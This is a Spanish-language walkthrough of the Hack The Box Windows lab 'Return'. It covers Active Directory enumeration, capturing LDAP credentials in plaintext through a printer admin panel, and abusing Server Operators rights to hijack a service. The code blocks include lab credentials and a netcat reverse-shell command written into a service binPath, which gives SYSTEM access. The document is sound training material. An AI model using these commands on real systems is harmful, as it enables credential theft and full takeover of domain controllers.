# Return

![](../../../../~gitbook/image.md)Publicado: 23 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
OS: Windows
### 📝 Descripción
Return es una máquina Windows de dificultad Easy que simula un entorno de Active Directory con un panel de administración de impresoras web. La máquina presenta vulnerabilidades relacionadas con la configuración insegura de autenticación LDAP y privilegios excesivos del usuario de servicio.La explotación inicial se basa en la captura de credenciales en texto plano mediante la manipulación de la configuración de un panel de administración de impresoras que utiliza LDAP sin cifrado (puerto 389). Una vez obtenidas las credenciales, se aprovechan los privilegios del grupo "Server Operators" para modificar servicios existentes y lograr escalada de privilegios a SYSTEM.Esta máquina es ideal para practicar técnicas de:- Enumeración de servicios en entornos Windows/AD
- Captura de credenciales mediante configuraciones inseguras
- Escalada de privilegios mediante manipulación de servicios
- Uso de WinRM para acceso remoto

### 🎯 Resumen
AspectoDetalleVulnerabilidad PrincipalConfiguración insegura de LDAP (puerto 389 sin cifrado)Vector de AccesoCaptura de credenciales mediante manipulación de configuración webUsuario Inicialsvc-printerEscalada de PrivilegiosModificación de servicios (grupo Server Operators)Herramientas PrincipalesNmap, Evil-WinRM, Netcat, sc.exe
### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🔍 Escaneo de puertos

#### 🔬 Enumeración de servicios

#### 🎯 Análisis de servicios identificados
Servicios críticos identificados:- Puerto 80 (HTTP): Panel de administración de impresoras HTB
- Puerto 389 (LDAP): Active Directory LDAP sin cifrado
- Puerto 5985 (WinRM): Windows Remote Management habilitado
- Puerto 445 (SMB): Compartición de archivos de Windows
- Puerto 88 (Kerberos): Autenticación de dominio
⚠️ Importante: Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🚪 Acceso Inicial

#### 📁 Enumeración SMB
Dado que no disponemos de credenciales, tratamos de enumerar sin éxito este servicio mediante una sesión nula:
#### 🔐 Enumeración LDAP
Tampoco logramos enumerar nada de forma anónima contra LDAP:
#### 🌐 Análisis del servicio HTTP (Puerto 80)
![](../../../../~gitbook/image.md)Vemos una cuenta de usuario que se está autenticando contra LDAP:![](../../../../~gitbook/image.md)Añadimos el vhost printer.return.local a nuestro fichero /etc/hosts.En la imagen anterior en la pestaña "Settings" vemos que la impresora utiliza el puerto LDAP inseguro 389 en lugar de LDAPS 636 seguro para la comunicación, lo que significa que las credenciales se pueden capturar en texto claro.
#### 🎣 Captura de credenciales
Dado que tenemos permisos de edición, podemos manipular la petición para dirigirla a un recurso nuestro en lugar de printer.return.local y al hacer clic en "Update" podremos capturar las credenciales.Para hacer esto, una forma sería iniciar un listener con netcat en el puerto 389 de nuestro host de ataque:A continuación deberemos especificar la IP de la interfaz tun0 nuestro host de ataque y hacer click en "Update":![](../../../../~gitbook/image.md)Y podremos capturar la contraseña en claro: ![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Return/5.png]]Credenciales obtenidas:- Usuario: `svc-printer`
- Contraseña: `1edFg43012!!`

#### ✅ Verificación de credenciales
Verificamos la credencial con los servicios SMB y WinRM y verificamos que podemos autenticarnos mediante WinRM. Usamos la herramienta evil-winrm para ganar acceso al sistema usando este servicio:![](../../../../~gitbook/image.md)
#### 🔌 Conexión via WinRM

#### 🏁 Primera flag
Capturamos la primera flag en el directorio Desktop del usuario svc-printer:
### 🔝 Escalada de privilegios

#### 🔍 Enumeración de privilegios
Enumeramos privilegios del usuario svc-printer:![](../../../../~gitbook/image.md)Privilegios importantes identificados:- `SeLoadDriverPrivilege`
- `SeBackupPrivilege`
- `SeRestorePrivilege`

#### 👥 Análisis de membresía de grupos
Si verificamos la información del usuario svc-printer vemos que pertenece entre otros al grupo Server Operators:![](../../../../~gitbook/image.md)💡 Nota crítica: Los miembros que pertenecen al grupo Server Operators pueden administrar controladores de dominio y pueden también detener e iniciar servicios.
#### 🔧 Enumeración de servicios
Echamos un vistazo a los servicios que se están ejecutando en la máquina:![](../../../../~gitbook/image.md)
#### 🎯 Explotación de privilegios de servicio
Plan A - Crear servicio nuevo: Podemos probar a crear un servicio propio que manejaremos a nuestro antojo para establecer una conexión reversa:Intentamos crear nuestro servicio pero obtenemos error de acceso denegado:Plan B - Modificar servicio existente: En lugar de crear un servicio nuevo, podemos intentar editar uno ya existente:¡Funciona con el servicio VMTools!![](../../../../~gitbook/image.md)
#### 🚀 Ejecución del ataque
- Iniciamos listener en nuestro host de ataque:
- Detenemos el servicio:
- Iniciamos el servicio:

#### 👑 Obtención de acceso root
Recibimos la conexión reversa como usuario de altos privilegios:
#### 🏆 Flag de root

- [🎯 Resumen](#resumen)
- [🔭 Reconocimiento](#reconocimiento)
- [🚪 Acceso Inicial](#acceso-inicial)
- [🔝 Escalada de privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.11.108
PING 10.10.11.108 (10.10.11.108) 56(84) bytes of data.
64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=47.6 ms
64 bytes from 10.10.11.108: icmp_seq=2 ttl=127 time=48.7 ms

--- 10.10.11.108 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 47.577/48.131/48.685/0.554 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.108 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49686,49697,64277
```

```
nmap -sC -sV -p$ports 10.10.11.108 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 18:51 CEST
Nmap scan report for 10.10.11.108
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-23 17:18:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
64277/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
echo "10.10.11.108 return.local" | sudo tee -a /etc/hosts
```

```
smbclient -N -L //10.10.11.152
```

```
enum4linux 10.10.11.108
```

```
netexec smb 10.10.11.108 -u '' -p '' --users
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\:

~/Documents/VPN ❯ netexec smb 10.10.11.108 -u '' -p '' --shares
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\:
SMB         10.10.11.108    445    PRINTER          [-] Error enumerating shares: STATUS_ACCESS_DENIED

~/Documents/VPN ❯ netexec smb 10.10.11.108 -u '' -p '' --rid-brute
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\:
SMB         10.10.11.108    445    PRINTER          [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

```
ldapsearch -x -H ldap://return.local -b "DC=return,DC=local" "(objectClass=user)" sAMAccountName mail
```

```
netexec ldap 10.10.11.108 -u '' -p '' --users
LDAP        10.10.11.108    389    PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
LDAP        10.10.11.108    389    PRINTER          [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAP        10.10.11.108    389    PRINTER          [+] return.local\:
LDAP        10.10.11.108    389    PRINTER          [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

```
nc -nlvp 389
```

```
netexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```

```
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

```
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir

Directory: C:\Users\svc-printer\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/23/2025   9:50 AM             34 user.txt
```

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd C:\Temp
*Evil-WinRM* PS C:\Temp> upload nc.exe
```

```
*Evil-WinRM* PS C:\Temp> sc.exe create revshell binPath="C:\Temp\nc.exe -e cmd 10.10.14.2 443"

[SC] OpenSCManager FAILED 5:

Access is denied.
```

```
sc.exe config VMTools binPath="C:\Temp\nc.exe -e cmd 10.10.14.2 443"
```

```
rlwrap nc -nlvp 443
```

```
sc.exe stop VMTools
```

```
sc.exe start VMTools
```

```
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.108] 56898
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```
C:\Users\Administrator\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 3A0C-428E

Directory of C:\Users\Administrator\Desktop

09/27/2021  04:22 AM              .
09/27/2021  04:22 AM              ..
06/23/2025  09:50 AM                34 root.txt
1 File(s)             34 bytes
2 Dir(s)   8,826,060,800 bytes free
```
